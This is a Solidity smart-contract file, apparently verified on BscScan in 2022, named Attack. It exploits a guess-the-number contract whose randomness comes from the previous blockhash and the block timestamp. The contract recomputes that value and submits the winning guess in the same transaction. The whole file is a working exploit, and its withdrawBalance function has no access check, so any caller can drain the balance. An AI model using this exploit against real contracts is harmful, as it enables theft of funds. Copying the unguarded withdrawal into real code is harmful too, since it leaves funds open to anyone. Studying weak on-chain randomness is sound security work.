/**
 *Submitted for verification at BscScan.com on 2022-09-02
*/

pragma solidity ^0.8.1;


interface GTNC {
    function guess(uint256 n) external payable;
}

contract Attack {

    GTNC gtnc;
    
    constructor(address payable _addr) payable {
        require(msg.value != 0);
        gtnc = GTNC(_addr);
    }

    function attack() public {
        
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        gtnc.guess{value: 1 gwei}(answer);
        }

    fallback() external payable{        
    }

    receive() external payable{        
    }

    function preAttack() public view returns(uint256 answer) {
        answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
    }

    function withdrawBalance() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function checkBalance() public view returns(uint bal, uint bal1, uint bal2){
        bal = address(this).balance;
        bal1 = bal/(10**9);
        bal2 = bal/(10**18);
    }
}